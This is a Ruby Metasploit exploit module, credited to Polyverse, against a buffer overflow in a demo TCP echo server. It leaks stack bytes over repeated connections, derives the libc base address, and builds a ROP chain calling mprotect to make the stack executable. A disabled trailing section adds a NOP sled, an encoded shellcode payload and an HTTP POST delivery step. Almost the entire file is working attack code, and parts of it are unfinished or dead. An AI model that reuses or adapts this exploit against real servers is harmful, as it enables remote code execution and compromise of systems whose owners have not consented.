##
# This module requires Metasploit
##

require "test/unit"

class MetasploitModule < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::Tcp

def initialize(info = {})
	super(
		update_info(
			info,
			'Name'		=> 'Polyverse tcp_echo_server example',
			'Description'	=> 'This is a module for exploiting a buffer overflow in tcp_echo_server',
			'Author'	=> 'Polyverse Corp.',
			'References'	=>
			[
				[ 'URL', 'https://polyverse.io' ],
			],
			'Platform'	=> 'linux',
			'Payload'	=> {},
			'Arch'		=> [ARCH_X64],
			'Targets'	=> 
			[
				[
					'Linux x64',
					{
						'Arch'	=> ARCH_X64,
						'Ret'	=> 0x7fffffffffff
					}
				]
			],
 			'DefaultTarget'	=> 0
		)
	)

	register_options(
	[
		OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
		OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
		OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
	])
end

# Returns that the remote host is always vulnerable
def check
	print_status("def check...")
	return Exploit::CheckCode::Vulnerable
end

def exploit
	print_status("start exploit...")

	o_libc_lcsm	= 0x021e50	# __libc_start_main() offset in libc.so.6
	o_libc_mprotect	= 0x0f8550	# offset to mprotect in libc.so.6
	o_libc_poprdi	= 0x0f0800	# offset to gadget "pop rdi" in libc.so.6
	o_libc_poprsi	= 0x0e780b	# offset to gadget "pop rsi" in libc.so.6
	o_libc_poprdx	= 0x0c0d40	# offset to gadget "pop rdx" in libc.so.6

	o_libc_lcsmr	= 0x0000f5	# main return-to offset in __libc_start_main

	a_stack_base	= 0x7ffffffde000
	s_stack_length	= 0x21000

	# Leak the next n characters
	def probe(n, buf)
		str = ""
		for i in 1..n
			connect
			sock.write buf 
			sleep 0.5
			buf = sock.read(buf.length+1)
			disconnect
		end
		return buf[-n, n], buf.length - n, buf
	end

	# Presently, this converter assumes little-endian
	def as_uint(str)
		n = 0
		for i in 1..str.length
			if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
				n = (n << 8) + str[str.length - i].ord
			else
				n = (n << 8) + str[i - 1].ord
			end
		end

		return n
	end

	# Start looking beyond the 80 byte buffer
	buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

	# vuln_padding
	vuln_padding_str, vuln_padding_idx, buf = probe(12, buf)
	p "vuln_padding_str", vuln_padding_str.unpack('H*'), ""

	# vuln_n
	vuln_n_str, vuln_n_idx, buf = probe(4, buf)
	vuln_n = as_uint(vuln_n_str)
	p "vuln_n_str", vuln_n_str.unpack('H*'), vuln_n.to_s(16), ""

	# vuln_save_bp
	vuln_saved_bp_str, vuln_saved_bp_idx, buf = probe(8, buf)
	vuln_saved_bp = as_uint(vuln_saved_bp_str)
	p "vuln_saved_bp_str", vuln_saved_bp_str.unpack('H*'), vuln_saved_bp.to_s(16), ""

	# vuln_ret_addr
	vuln_ret_addr_str, vuln_ret_addr_idx, buf = probe(8, buf)
	vuln_ret_addr = as_uint(vuln_ret_addr_str)
	p "vuln_ret_addr_str:", vuln_ret_addr_str.unpack('H*'), vuln_ret_addr.to_s(16), ""

	# main_argv_save
	main_argv_save_str, main_argv_save_idx, buf = probe(8, buf)
	main_argv_save = as_uint(main_argv_save_str)
	p "main_argv_save_str", main_argv_save_str.unpack('H*'), main_argv_save.to_s(16), ""

	# main_padding
	main_padding_str, main_padding_idx, buf = probe(4, buf)
	p "main_padding_str", main_padding_str.unpack('H*'), ""

	# main_argc_save
	main_argc_save_str, main_argc_save_idx, buf = probe(4, buf)
	main_argc_save = as_uint(main_argc_save_str)
	p "main_argc_save_str", main_argc_save_str.unpack('H*'), main_argc_save.to_s(16), ""

	# main_client_addr
	main_client_addr_str, main_client_addr_idx, buf = probe(16, buf)
	p "main_client_addr_str", main_client_addr_str.unpack('H*'), ""

	# main_server_addr
	main_server_addr_str, main_server_addr_idx, buf = probe(16, buf)
	p "main_server_addr_str", main_server_addr_str.unpack('H*'), ""

	# main_cli_len
	main_cli_len_str, main_cli_len_idx, buf = probe(4, buf)
	main_cli_len = as_uint(main_cli_len_str)
	p "main_cli_len_str", main_cli_len_str.unpack('H*'), main_cli_len.to_s(16), ""

	# main_client_fd
	main_client_fd_str, main_client_fd_idx, buf = probe(4, buf)
	main_client_fd = as_uint(main_client_fd_str)
	p "main_client_fd_str", main_client_fd_str.unpack('H*'), main_client_fd.to_s(16), ""

	# main_server_fd
	main_server_fd_str, main_server_fd_idx, buf = probe(4, buf)
	main_server_fd = as_uint(main_server_fd_str)
	p "main_server_fd_str", main_server_fd_str.unpack('H*'), main_server_fd.to_s(16), ""

	# main_server_port
	main_server_port_str, main_server_port_idx, buf = probe(4, buf)
	main_server_port = as_uint(main_server_port_str)
	p "main_server_port_str", main_server_port_str.unpack('H*'), main_server_port.to_s(16), ""

	# The next location is mains saved frame pointer (BP)
	main_saved_bp_str, main_saved_bp_idx, buf = probe(8, buf)
	main_saved_bp = as_uint(main_saved_bp_str)
	p "main_saved_bp_str", main_saved_bp_str.unpack('H*'), main_saved_bp.to_s(16), ""

	# The next location is main callers return address (glib main)
	main_ret_addr_str, main_ret_addr_idx, buf = probe(8, buf)
	main_ret_addr = as_uint(main_ret_addr_str)
	p "main_ret_addr_str:", main_ret_addr_str.unpack('H*'), main_ret_addr.to_s(16), ""

	# Calculate the location in memory where libc starts
	a_libc_base = main_ret_addr - o_libc_lcsmr - o_libc_lcsm
	p "a_libc_base:", a_libc_base.to_s(16), ""

	# Address of mprotect()
	a_libc_mprotect = a_libc_base + o_libc_mprotect
	p "a_libc_mprotect:", a_libc_mprotect.to_s(16), ""

	# Address of gadget "pop rdi; ret"
	a_libc_poprdi = a_libc_base + o_libc_poprdi
	p "a_libc_poprdi:", a_libc_poprdi.to_s(16), ""

	# Address of gadget "pop rsi; ret"
	a_libc_poprsi = a_libc_base + o_libc_poprsi
	p "a_libc_poprsi:", a_libc_poprsi.to_s(16), ""

	# Address of gadget "pop rdx; ret"
	a_libc_poprdx = a_libc_base + o_libc_poprdx
	p "a_libc_poprdx:", a_libc_poprdx.to_s(16), ""

	#Build a payload
	b = buf[0,vuln_ret_addr_idx]
	b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
	b += Rex::Arch.pack_addr(target.arch, a_stack_base)
	b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
	b += Rex::Arch.pack_addr(target.arch, s_stack_length)
	b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
	b += Rex::Arch.pack_addr(target.arch, 0x7)
	b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)
	b += Rex::Arch.pack_addr(target.arch, vuln_ret_addr)

	p buf, b

	s, i, b = probe(1, b)
	return

	# IGNORE EVERYTHING PAST THIS POINT FOR NOW
	
    # First approximation of where we should return to
    ret = target.ret					# Base address of "ret" when passed a single character
    ret += 7 + 17 + 8					# Location immediately after "owned" return address
    ret += datastore['PREPAD'] / 2			# Move halfway into the pre-NOP-sled we're about to build

    # Build the payload that delivers the goods
    p = "a" * 17					# "Owned" return address is at 18..25 in the message
    p += Rex::Arch.pack_addr(target.arch, ret)		# The contents will be backpatched later
    p += datastore['NOP'] * datastore['PREPAD']		# Build a NOP sled before our shellcode
    p += payload.encoded				# Sandwich the shellcode here
    p += datastore['NOP'] * datastore['POSTPAD']	# Build a NOP sled after the shellcode (n/a right now)
    if (p.length % 3) == 0 then b += 'b' end		# Guarantee a trailing "=" after base64 encoding

    # Proceed as if this is the final payload
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

    # Deal with the side-effect of the payload size
    ret -= p64.length / 16 * 16				# Location moves based on payload size which we now know
    p[17..24] = Rex::Arch.pack_addr(target.arch, ret)	# We should be very close to the middle of the NOP sled again

    # Finalize the payload (should be the same size)
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Re-encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

#   res = send_request_raw({'uri'=>'/index.php?q=x'})

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"index.php"),
      'method'    => 'POST',
      'vars_post' => {
      'q' => p64
      }
    })

    print_status("#{res}")
    print_status("done exploit....")
  end
end
